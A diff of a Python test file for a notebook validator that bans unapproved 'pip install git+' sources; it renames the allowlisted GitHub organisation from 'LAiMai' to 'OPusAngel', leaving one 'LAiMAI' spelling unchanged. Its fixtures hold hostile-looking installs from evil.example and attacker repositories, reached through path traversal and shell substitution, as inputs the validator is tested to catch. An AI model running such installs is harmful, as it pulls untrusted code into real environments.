@@ -1,6 +1,6 @@
 # SPDX-License-Identifier: AGPL-3.0-only
 # Copyright 2026-present the LAiM AI Inc. team.
-"""torch / torchcodec ABI guardrails (LAiMai/LAiM#7225)."""
+"""torch / torchcodec ABI guardrails (OPusAngel/LAiM#7225)."""
 
 from __future__ import annotations
 import argparse
@@ -645,7 +645,7 @@ def test_every_rule_reads_the_filtered_invocations():
 
     assert (
         nv.rule_inst_001_git_plus(
-            "!pip install git+https://github.com/LAiMai/LAiM-zoo.git", "nb.ipynb", 0
+            "!pip install git+https://github.com/OPusAngel/LAiM-zoo.git", "nb.ipynb", 0
         )
         == []
     )
@@ -742,7 +742,7 @@ def test_git_allowlist_is_scoped_to_each_source():
     line-level scan finds every `git+` target; the allowlist then applies to each."""
     nv = _load_notebook_validator_module()
 
-    allowed = "git+https://github.com/LAiMai/LAiM-zoo.git"
+    allowed = "git+https://github.com/OPusAngel/LAiM-zoo.git"
     evil = "git+https://example.com/evil.git"
 
     assert nv.rule_inst_001_git_plus(f"!pip install {allowed}", "nb.ipynb", 0) == []
@@ -811,12 +811,12 @@ def test_git_allowlist_matches_the_repository_not_a_substring():
         nv._git_source_repository("git+https://user:pw@github.com/state-spaces/mamba.git@v2.0")
         == "github.com/state-spaces/mamba"
     )
-    assert nv._git_source_is_allowed("git+https://github.com/LAiMai/LAiM-zoo.git")
+    assert nv._git_source_is_allowed("git+https://github.com/OPusAngel/LAiM-zoo.git")
     assert not nv._git_source_is_allowed(
-        "git+https://evil.example/repo/github.com/LAiMai/LAiM.git"
+        "git+https://evil.example/repo/github.com/OPusAngel/LAiM.git"
     )
 
-    smuggled = "!pip install git+https://evil.example/repo/github.com/LAiMai/LAiM.git"
+    smuggled = "!pip install git+https://evil.example/repo/github.com/OPusAngel/LAiM.git"
     assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
 
     assert (
@@ -1026,7 +1026,7 @@ def test_git_ban_reads_the_arguments_shlex_produced():
 
     assert (
         nv.rule_inst_001_git_plus(
-            '!pip install "git+"https://github.com/LAiMai/LAiM-zoo.git', "nb.ipynb", 0
+            '!pip install "git+"https://github.com/OPusAngel/LAiM-zoo.git', "nb.ipynb", 0
         )
         == []
     )
@@ -1229,30 +1229,30 @@ def test_torchao_floor_ignores_a_requirement_pip_skips():
 
 
 def test_git_allowlist_resolves_dot_segments_and_matches_exactly():
-    """`LAiMai/LAiM/../../attacker/repo` reads as an allowlisted prefix and resolves
+    """`OPusAngel/LAiM/../../attacker/repo` reads as an allowlisted prefix and resolves
     elsewhere. Every entry is one `host/org/repo` and pip puts a subdirectory in the
     fragment, so the match is exact."""
     nv = _load_notebook_validator_module()
 
     assert (
         nv._git_source_repository(
-            "git+https://github.com/LAiMai/LAiM/../../attacker/repo.git"
+            "git+https://github.com/OPusAngel/LAiM/../../attacker/repo.git"
         )
         == "github.com/attacker/repo"
     )
     assert not nv._git_source_is_allowed(
-        "git+https://github.com/LAiMai/LAiM/../../attacker/repo.git"
+        "git+https://github.com/OPusAngel/LAiM/../../attacker/repo.git"
     )
-    assert not nv._git_source_is_allowed("git+https://github.com/LAiMai/LAiM/extra.git")
+    assert not nv._git_source_is_allowed("git+https://github.com/OPusAngel/LAiM/extra.git")
 
     for allowed in (
-        "git+https://github.com/LAiMai/LAiM.git",
+        "git+https://github.com/OPusAngel/LAiM.git",
         "git+https://user:pw@github.com/state-spaces/mamba.git@v2.0",
-        "git+https://github.com/LAiMai/LAiM-zoo.git#subdirectory=x",
+        "git+https://github.com/OPusAngel/LAiM-zoo.git#subdirectory=x",
     ):
         assert nv._git_source_is_allowed(allowed), allowed
 
-    smuggled = "!pip install git+https://github.com/LAiMai/LAiM/../../attacker/repo.git"
+    smuggled = "!pip install git+https://github.com/OPusAngel/LAiM/../../attacker/repo.git"
     assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))
 
 
@@ -1540,7 +1540,7 @@ def test_git_sources_are_matched_case_insensitively():
 
     assert (
         nv.rule_inst_001_git_plus(
-            "!pip install Git+https://github.com/LAiMai/LAiM-zoo.git", "nb.ipynb", 0
+            "!pip install Git+https://github.com/OPusAngel/LAiM-zoo.git", "nb.ipynb", 0
         )
         == []
     )
@@ -2729,14 +2729,14 @@ def test_a_vcs_revision_is_split_from_the_right():
     nv = _load_notebook_validator_module()
 
     traversal = (
-        "!pip install git+https://github.com/LAiMai/LAiM@fake/../../attacker/repo@main"
+        "!pip install git+https://github.com/OPusAngel/LAiM@fake/../../attacker/repo@main"
     )
     assert [f.rule for f in nv.rule_inst_001_git_plus(traversal, "nb.ipynb", 0)] == ["R-INST-001"]
     for allowed in (
-        "!pip install git+https://github.com/LAiMai/LAiM",
-        "!pip install git+https://github.com/LAiMai/LAiM.git",
-        "!pip install git+https://github.com/LAiMai/LAiM@main",
-        "!pip install git+https://github.com/LAiMai/LAiM.git@nightly",
+        "!pip install git+https://github.com/OPusAngel/LAiM",
+        "!pip install git+https://github.com/OPusAngel/LAiM.git",
+        "!pip install git+https://github.com/OPusAngel/LAiM@main",
+        "!pip install git+https://github.com/OPusAngel/LAiM.git@nightly",
     ):
         assert nv.rule_inst_001_git_plus(allowed, "nb.ipynb", 0) == [], allowed
 
@@ -3368,14 +3368,14 @@ def test_a_substituted_source_drops_its_shell_delimiters():
 
     assert (
         nv.rule_inst_001_git_plus(
-            "!pip install $(printf %s git+https://github.com/LAiMai/LAiM.git)",
+            "!pip install $(printf %s git+https://github.com/OPusAngel/LAiM.git)",
             "nb.ipynb",
             0,
         )
         == []
     )
-    assert nv._git_source_repository("git+https://github.com/LAiMai/LAiM.git)") == (
-        "github.com/LAiMai/LAiM"
+    assert nv._git_source_repository("git+https://github.com/OPusAngel/LAiM.git)") == (
+        "github.com/OPusAngel/LAiM"
     )
     assert [
         f.rule
@@ -3962,8 +3962,8 @@ def test_an_allowlisted_repository_is_matched_whatever_the_suffix_case():
     nv = _load_notebook_validator_module()
 
     for spelling in (
-        "git+https://github.com/LAiMai/LAiM.GIT",
-        "git+https://github.com/LAiMai/LAiM.Git",
+        "git+https://github.com/OPusAngel/LAiM.GIT",
+        "git+https://github.com/OPusAngel/LAiM.Git",
         "git+https://GitHub.com/LAiMAI/LAiM.GIT@main",
     ):
         assert nv.rule_inst_001_git_plus(f"!pip install {spelling}", "nb.ipynb", 0) == [], spelling
